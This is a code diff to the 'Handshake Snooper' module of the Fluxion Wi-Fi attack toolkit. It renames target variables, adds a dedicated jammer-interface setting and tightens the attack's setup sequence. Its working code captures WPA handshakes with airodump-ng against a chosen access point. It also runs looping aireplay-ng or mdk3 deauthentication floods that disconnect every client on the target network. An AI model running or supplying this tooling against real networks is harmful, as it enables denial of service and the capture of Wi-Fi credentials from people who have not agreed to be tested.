@@ -94,7 +94,7 @@ handshake_snooper_arbiter_daemon() {
       "$FLUXIONWorkspacePath/handshake_snooper.log"
     hash_check_handshake "$HANDSHAKEVerifierIdentifier" \
       "$FLUXIONWorkspacePath/capture/recent.cap" \
-      "$APTargetSSID" "$APTargetMAC"
+      "$FluxionTargetSSID" "$FluxionTargetMAC"
     handshake_snooper_arbiter_daemon_verified=$?
 
     # If synchronously searching, restart the captor and deauthenticator after checking.
@@ -122,7 +122,7 @@ handshake_snooper_arbiter_daemon() {
 
   # Move handshake to storage if one was acquired.
   mv "$FLUXIONWorkspacePath/capture/recent.cap" \
-    "$FLUXIONPath/attacks/Handshake Snooper/handshakes/$APTargetSSIDClean-$APTargetMAC.cap"
+    "$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC.cap"
 
   # Signal parent process the verification terminated.
   kill -s SIGABRT $1
@@ -142,9 +142,9 @@ handshake_snooper_start_captor() {
 
   handshake_snooper_stop_captor
 
-  xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $APTargetChannel)" \
+  xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $FluxionTargetChannel)" \
     $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
-    airodump-ng --ignore-negative-one -d $APTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $APTargetChannel -a $WIMonitor &
+    airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
   local parentPID=$!
 
   while [ ! "$HANDSHAKECaptorPID" ]; do
@@ -170,27 +170,29 @@ handshake_snooper_start_deauthenticator() {
   # Prepare deauthenticators
   case "$HANDSHAKEDeauthenticatorIdentifier" in
     "$HandshakeSnooperMdk3MethodOption")
-      echo "$APTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst ;;
+      echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst ;;
   esac
 
   # Start deauthenticators.
   case "$HANDSHAKEDeauthenticatorIdentifier" in
     "$HandshakeSnooperAireplayMethodOption")
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $APTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $APTargetMAC --ignore-negative-one $WIMonitor; done" &
+        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
       HANDSHAKEDeauthenticatorPID=$!
     ;;
     "$HandshakeSnooperMdk3MethodOption")
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
-        -title "Deauthenticating all clients on $APTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel; done" &
+        -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
+        "while true; do sleep 7; timeout 3 mdk3 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $FluxionTargetChannel; done" &
       HANDSHAKEDeauthenticatorPID=$!
     ;;
   esac
 }
 
+
 handshake_snooper_unset_deauthenticator_identifier() {
+  if [ ! "$HANDSHAKEDeauthenticatorIdentifier" ]; then return 1; fi
   HANDSHAKEDeauthenticatorIdentifier=""
 }
 
@@ -218,7 +220,35 @@ handshake_snooper_set_deauthenticator_identifier() {
   fi
 }
 
+handshake_snooper_unset_jammer_interface() {
+  if [ ! "$HandshakeSnooperJammerInterface" ]; then return 1; fi
+  HandshakeSnooperJammerInterface=""
+
+  # Check if we're automatically selecting the interface & skip
+  # this one if so to take the user back properly.
+  local interfacesAvailable
+  readarray -t interfacesAvailable < <(attack_targetting_interfaces)
+
+  if [ ${#interfacesAvailable[@]} -le 1 ]; then return 2; fi
+}
+
+handshake_snooper_set_jammer_interface() {
+  if [ "$HandshakeSnooperJammerInterface" ]; then return 0; fi
+  if [ "$HANDSHAKEDeauthenticatorIdentifier" = \
+    "$HandshakeSnooperMonitorMethodOption" ]; then return 0; fi
+
+  echo "Running get interface." > $FLUXIONOutputDevice
+  if ! fluxion_get_interface attack_targetting_interfaces; then
+    echo "Failed to get interface" > $FLUXIONOutputDevice
+    return 1
+  fi
+
+  echo "Succeeded get interface." > $FLUXIONOutputDevice
+  HandshakeSnooperJammerInterface=${FluxionInterfaces[$FluxionInterfaceSelected]}
+}
+
 handshake_snooper_unset_verifier_identifier() {
+  if [ ! "$HANDSHAKEVerifierIdentifier" ]; then return 1; fi
   HANDSHAKEVerifierIdentifier=""
 }
 
@@ -249,6 +279,7 @@ handshake_snooper_set_verifier_identifier() {
 }
 
 handshake_snooper_unset_verifier_interval() {
+  if [ ! "$HANDSHAKEVerifierInterval" ]; then return 1; fi
   HANDSHAKEVerifierInterval=""
 }
 
@@ -275,6 +306,7 @@ handshake_snooper_set_verifier_interval() {
 }
 
 handshake_snooper_unset_verifier_synchronicity() {
+  if [ ! "$HANDSHAKEVerifierSynchronicity" ]; then return 1; fi
   HANDSHAKEVerifierSynchronicity=""
 }
 
@@ -370,22 +402,22 @@ prep_attack() {
   # I've reported the bug, we can add it when fixed.
   local sequence=(
     "set_deauthenticator_identifier"
+    "set_jammer_interface"
     "set_verifier_identifier"
     "set_verifier_interval"
     "set_verifier_synchronicity"
   )
 
-  if fluxion_do_sequence handshake_snooper sequence[@]; then
-    HandshakeSnooperState="Ready"
-  else
-    unprep_attack
+  if ! fluxion_do_sequence handshake_snooper sequence[@]; then
     return 1
   fi
+
+  HandshakeSnooperState="Ready"
 }
 
 stop_attack() {
   if [ "$HANDSHAKEArbiterPID" ]; then
-    kill -s SIGABRT $HANDSHAKEArbiterPID &>$FLUXIONOutputDevice
+    kill -s SIGABRT $HANDSHAKEArbiterPID &> $FLUXIONOutputDevice
   fi
 
   HANDSHAKEArbiterPID=""
